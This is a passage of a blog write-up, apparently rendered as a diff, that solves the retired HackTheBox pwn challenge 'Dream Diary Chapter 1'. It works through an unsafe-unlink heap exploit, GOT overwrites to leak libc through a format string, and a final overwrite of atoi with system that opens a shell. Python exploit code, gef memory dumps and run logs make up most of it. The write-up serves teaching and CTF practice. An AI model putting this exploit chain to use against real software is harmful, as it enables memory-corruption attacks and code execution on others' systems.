+    <span class="token punctuation">[</span><span class="token number">0x00000000022360a0</span>     <span class="token number">42</span> <span class="token number">42</span> <span class="token number">42</span> <span class="token number">42</span> <span class="token number">42</span> <span class="token number">42</span> <span class="token number">42</span> <span class="token number">42</span> <span class="token number">42</span> <span class="token number">42</span> <span class="token number">42</span> <span class="token number">42</span> <span class="token number">42</span> <span class="token number">42</span> <span class="token number">42</span> <span class="token number">42</span>    BBBBBBBBBBBBBBBB<span class="token punctuation">]</span>
+Chunk<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x2236130</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x90</span><span class="token punctuation">,</span> flags<span class="token operator">=</span>PREV_INUSE<span class="token punctuation">)</span>
+    <span class="token punctuation">[</span><span class="token number">0x0000000002236130</span>     <span class="token number">43</span> <span class="token number">43</span> <span class="token number">43</span> <span class="token number">43</span> <span class="token number">43</span> <span class="token number">43</span> <span class="token number">43</span> <span class="token number">43</span> <span class="token number">43</span> <span class="token number">43</span> <span class="token number">43</span> <span class="token number">43</span> <span class="token number">43</span> <span class="token number">43</span> <span class="token number">43</span> <span class="token number">43</span>    CCCCCCCCCCCCCCCC<span class="token punctuation">]</span>
+Chunk<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x22361c0</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x90</span><span class="token punctuation">,</span> flags<span class="token operator">=</span>PREV_INUSE<span class="token punctuation">)</span>
+    <span class="token punctuation">[</span><span class="token number">0x00000000022361c0</span>     <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">41</span> 0e <span class="token number">02</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>    <span class="token ellipsis">...</span><span class="token ellipsis">...</span>..A<span class="token ellipsis">...</span><span class="token ellipsis">...</span>.<span class="token punctuation">]</span>
+gef➤  x<span class="token operator">/</span>10xg <span class="token number">0x6020c0</span>
+<span class="token number">0x6020c0</span><span class="token operator">:</span>    <span class="token number">0x0000000002236010</span>    <span class="token number">0x00000000022360a0</span>
+<span class="token number">0x6020d0</span><span class="token operator">:</span>    <span class="token number">0x0000000002236130</span>    <span class="token number">0x00000000006020c0</span></code></pre>
+<p>Now as we see the global array having a pointer to itself on index 3, this means that the chunk 3 is now pointing to the global array itself, let’s see what happened under the hood when we did <code>free(4)</code>, I will break it down in following steps:-</p>
+<ul>
+<li>There was a forged free’d chunk with the <code>fd</code> and <code>bk</code> pointing to the global array.</li>
+<li>When the <code>free(4)</code> is called and the chunk <code>4</code> was initally freed and the forged chunk was coalesced with the chunk <code>4</code>.</li>
+<li>Once coalesced, the unlink is triggered resulting in the 3rd chunk pointer in the global array being overwritten with the address we wanted it to.</li>
+</ul>
+<p>Now, we have the control over the chunk <code>3</code>, we can edit it and get the other pointer overwritten too, if we could overwrite one of the entry with any GOT address, we can get the control over the binary.</p>
+<pre class=" language-py"><code class="language-py">log.info("Changing freegot to print@plt for LIBC Leak")
+edit(3, p64(elf.got("free")))
+edit(0, p64(elf.plt("printf")))</code></pre>
+<p>So, from the code above you can see, first we overwrite the pointer returned by the chunk <code>3</code> which would be the global array itself, then we request for the first chunk via the <code>edit</code> function and since the 0th chunk address point to the <code>free@got</code>, we get the pointer of <code>free@GOT</code> and then it is being overwritten with the <code>printf@plt</code>.</p>
+<pre class=" language-r"><code class="language-r"><span class="token number">0</span>  <span class="token punctuation">[</span><span class="token number">13</span><span class="token operator">:</span><span class="token number">09</span><span class="token operator">:</span><span class="token number">56</span><span class="token punctuation">]</span> vagrant<span class="token operator">@</span>oracle<span class="token punctuation">(</span>oracle<span class="token punctuation">)</span> HackTheBox<span class="token operator">></span> python3 chapter1.py 
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting program <span class="token string">'./chapter1'</span><span class="token operator">:</span> PID <span class="token number">1985</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Analyzing <span class="token operator">/</span>media<span class="token operator">/</span>sf_Pwning<span class="token operator">/</span>HackTheBox<span class="token operator">/</span>chapter1
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Analyzing <span class="token operator">/</span>home<span class="token operator">/</span>vagrant<span class="token operator">/</span>tools<span class="token operator">/</span>LibcSearcher<span class="token operator">/</span>libc<span class="token operator">-</span>database<span class="token operator">/</span>db<span class="token operator">/</span>libc6_2<span class="token number">.23</span><span class="token operator">-</span>0ubuntu10_amd64.so
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Created <span class="token number">5</span> chunks of size<span class="token operator">:</span> <span class="token number">0x88</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Preparing a fake chunk<span class="token ellipsis">...</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Fake chunk<span class="token operator">:</span>
+    <span class="token number">00000000</span><span class="token operator">:</span>  <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>  <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>  <span class="token operator">|</span><span class="token ellipsis">...</span><span class="token ellipsis">...</span><span class="token ellipsis">...</span><span class="token ellipsis">...</span><span class="token ellipsis">...</span>.<span class="token operator">|</span>
+    <span class="token number">00000010</span><span class="token operator">:</span>  c0 <span class="token number">20</span> <span class="token number">60</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>  c8 <span class="token number">20</span> <span class="token number">60</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>  <span class="token operator">|</span>. `<span class="token ellipsis">...</span><span class="token ellipsis">...</span> `<span class="token ellipsis">...</span>..<span class="token operator">|</span>
+    <span class="token number">00000020</span><span class="token operator">:</span>  <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span>  <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span>  <span class="token operator">|</span>XXXXXXXXXXXXXXXX<span class="token operator">|</span>
+    <span class="token number">00000030</span><span class="token operator">:</span>  <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span>  <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span>  <span class="token operator">|</span>XXXXXXXXXXXXXXXX<span class="token operator">|</span>
+    <span class="token number">00000040</span><span class="token operator">:</span>  <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span>  <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span>  <span class="token operator">|</span>XXXXXXXXXXXXXXXX<span class="token operator">|</span>
+    <span class="token number">00000050</span><span class="token operator">:</span>  <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span>  <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span>  <span class="token operator">|</span>XXXXXXXXXXXXXXXX<span class="token operator">|</span>
+    <span class="token number">00000060</span><span class="token operator">:</span>  <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span>  <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span>  <span class="token operator">|</span>XXXXXXXXXXXXXXXX<span class="token operator">|</span>
+    <span class="token number">00000070</span><span class="token operator">:</span>  <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span>  <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span>  <span class="token operator">|</span>XXXXXXXXXXXXXXXX<span class="token operator">|</span>
+    <span class="token number">00000080</span><span class="token operator">:</span>  <span class="token number">80</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>  <span class="token number">90</span>                       <span class="token operator">|</span><span class="token ellipsis">...</span><span class="token ellipsis">...</span><span class="token ellipsis">...</span><span class="token operator">|</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Editing chunk <span class="token number">3</span> with a fakr chunk
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Triggering Unlink
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Changing freegot to print<span class="token operator">@</span>plt <span class="token keyword">for</span> LIBC Leak
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Switching to interactive mode
+Done<span class="token operator">!</span>
+
+<span class="token operator">+</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span>
+<span class="token operator">|</span>         Dream Diary          <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span>
+<span class="token operator">|</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> Allocate                 <span class="token operator">|</span>
+<span class="token operator">|</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> Edit                     <span class="token operator">|</span>
+<span class="token operator">|</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> Delete                   <span class="token operator">|</span>
+<span class="token operator">|</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> Exit                     <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span>
+<span class="token operator">></span><span class="token operator">></span> Invalid choice<span class="token operator">!</span>
+
+<span class="token operator">+</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span>
+<span class="token operator">|</span>         Dream Diary          <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span>
+<span class="token operator">|</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> Allocate                 <span class="token operator">|</span>
+<span class="token operator">|</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> Edit                     <span class="token operator">|</span>
+<span class="token operator">|</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> Delete                   <span class="token operator">|</span>
+<span class="token operator">|</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> Exit                     <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span>
+<span class="token operator">></span><span class="token operator">></span> <span class="token operator">$</span>  
+
+
+<span class="token punctuation">[</span>..snip..<span class="token punctuation">]</span>
+<span class="token number">0x0000000000400710</span>  printf<span class="token operator">@</span>plt
+gef➤  got
+
+GOT protection<span class="token operator">:</span> Partial RelRO <span class="token operator">|</span> GOT functions<span class="token operator">:</span> <span class="token number">11</span>
+
+<span class="token punctuation">[</span><span class="token number">0x602018</span><span class="token punctuation">]</span> free<span class="token operator">@</span>GLIBC_2<span class="token number">.2</span>.<span class="token number">5</span>  →  <span class="token number">0x400710</span></code></pre>
+<p>As you can see, we successfully overwritten the <code>free@got</code> with the PLT address of the <code>printf</code>. Now, we have the <code>printf</code>, as from the reverse engineering, we know that the free is done like <code>free(ptr[index])</code>, as the <code>free</code> is now <code>printf</code>, now it’ll do the <code>printf(ptr(index])</code>, as obvious it should be we have a format string vulnerability now, we can leak a LIBC address to defeat ASLR.</p>
+<pre class=" language-py"><code class="language-py">log.info("Getting __libc_start_main")
+allocate(0x88, "%15$p")
+delete(4)
+p.recvline()
+libc_start_main = int(p.recvline().strip(b"\n"), 16)
+log.info("__libc_start_main+240:    0x%x" %(libc_start_main))
+libc.address = libc_start_main - 240 - libc.function("__libc_start_main")
+
+log.info("LIBC                 :    0x%x" %(libc.address))</code></pre>
+<p>Running the exploit now, we will have the LIBC leak:-</p>
+<pre class=" language-py"><code class="language-py">0 [13:26:50] vagrant@oracle(oracle) HackTheBox> python3 chapter1.py 
+[+] Starting program './chapter1': PID 2449
+[*] Analyzing /media/sf_Pwning/HackTheBox/chapter1
+[*] Analyzing /home/vagrant/tools/LibcSearcher/libc-database/db/libc6_2.23-0ubuntu10_amd64.so
+[*] Created 5 chunks of size: 0x88
+[*] Preparing a fake chunk...
+[*] Fake chunk:
+    00000000:  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+    00000010:  c0 20 60 00 00 00 00 00  c8 20 60 00 00 00 00 00  |. `...... `.....|
+    00000020:  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
+    00000030:  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
+    00000040:  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
+    00000050:  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
+    00000060:  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
+    00000070:  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
+    00000080:  80 00 00 00 00 00 00 00  90                       |.........|
+[*] Editing chunk 3 with a fakr chunk
+[*] Triggering Unlink
+[*] Changing freegot to print@plt for LIBC Leak
+[*] Getting __libc_start_main
+[*] __libc_start_main+240:    0x7f01b54d3840
+[*] LIBC                 :    0x7f01b54b3010
+[*] Switching to interactive mode
+Done!
+
++------------------------------+
+|         Dream Diary          |
++------------------------------+
+| [1] Allocate                 |
+| [2] Edit                     |
+| [3] Delete                   |
+| [4] Exit                     |
++------------------------------+</code></pre>
+<p>Now, all left is to calculate the <code>system</code> address and then overwrite another GOT entry with the <code>system</code> address and enjoy the shell:-</p>
+<pre class=" language-py"><code class="language-py">system = p64(libc.function("system"))
+#system = system.replace(b"\x7f", b"\x16\x7f")
+edit(3, p32(elf.got("atoi")))
+edit(0, system)
+
+p.sendafter(">> ", "sh")
+p.interactive()</code></pre>
+<p>Now, running the final exploit:-</p>
+<pre class=" language-py"><code class="language-py">0 [13:30:14] vagrant@oracle(oracle) HackTheBox> python3 chapter1.py 
+[+] Starting program './chapter1': PID 2677
+[*] Analyzing /media/sf_Pwning/HackTheBox/chapter1
+[*] Analyzing /home/vagrant/tools/LibcSearcher/libc-database/db/libc6_2.23-0ubuntu10_amd64.so
+[*] Created 5 chunks of size: 0x88
+[*] Preparing a fake chunk...
+[*] Fake chunk:
+    00000000:  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+    00000010:  c0 20 60 00 00 00 00 00  c8 20 60 00 00 00 00 00  |. `...... `.....|
+    00000020:  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
+    00000030:  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
+    00000040:  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
+    00000050:  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
+    00000060:  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
+    00000070:  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
+    00000080:  80 00 00 00 00 00 00 00  90                       |.........|
+[*] Editing chunk 3 with a fakr chunk
+[*] Triggering Unlink
+[*] Changing freegot to print@plt for LIBC Leak
+[*] Getting __libc_start_main
+[*] __libc_start_main+240:    0x7f89ceb6c840
+[*] LIBC                 :    0x7f89ceb4c010
+[*] Switching to interactive mode
+Invalid choice!
+
++------------------------------+
+|         Dream Diary          |
++------------------------------+
+| [1] Allocate                 |
+| [2] Edit                     |
+| [3] Delete                   |
+| [4] Exit                     |
++------------------------------+
+>> $ 
+$ whoami
+vagrant
+$ 
+[*] Interrupted
+[*] Stopped program './chapter1'</code></pre>
+<p>And that was it, congratulations, now you learned the Unsafe Unlink, as my blog was silent for a while, this was in draft so here it is now.</p>
+
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        Author:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://pwning.tech" rel="external nofollow noreferrer">D4mianwayne</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        Link:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://pwning.tech/2020/10/19/dream-diary-chapter-1/">https://pwning.tech/2020/10/19/dream-diary-chapter-1/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        Reprint policy:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    All articles in this blog are used except for special statements
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    reprint polocy. If reproduced, please indicate source
+                    <a href="https://pwning.tech" target="_blank">D4mianwayne</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/unlink-htb-pwn-heap/">
+                                    <span class="chip bg-color">unlink, htb, pwn, heap</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="qq,qzone,wechat,weibo,douban,twitter" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;Current
+            </div>
+            <div class="card">
+                <a href="/2020/10/19/dream-diary-chapter-1/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="HTB Pwn - Dream Diary Chapter: 1">
+                        
+                        <span class="card-title">HTB Pwn - Dream Diary Chapter: 1</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            This is a writeup of a retired Pwn challenge on HackTheBox, although I wanted to it earlier but couldn’t get time for th
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-10-19
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/HackTheBox/" class="post-category">
+                                    HackTheBox
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/unlink-htb-pwn-heap/">
+                        <span class="chip bg-color">unlink, htb, pwn, heap</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/09/09/v8-pwn-downunderctf/">
+                    <div class="card-image">
+                        
+                        <img src="/img/banner/downunder.png" class="responsive-img" alt="DownunderCTF: V8 Pwn">
+                        
+                        <span class="card-title">DownunderCTF: V8 Pwn</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            In-depth write-up of the V8 challenge from DownUnderCTF 2020.
+ForewordUnfortunately I couldn’t solve the challenge, as i
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-09-09
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF-Writeup/" class="post-category">
+                                    CTF Writeup
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ctf-pwn-v8-browser-pwn/">
+                        <span class="chip bg-color">ctf, pwn, v8, browser pwn</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+
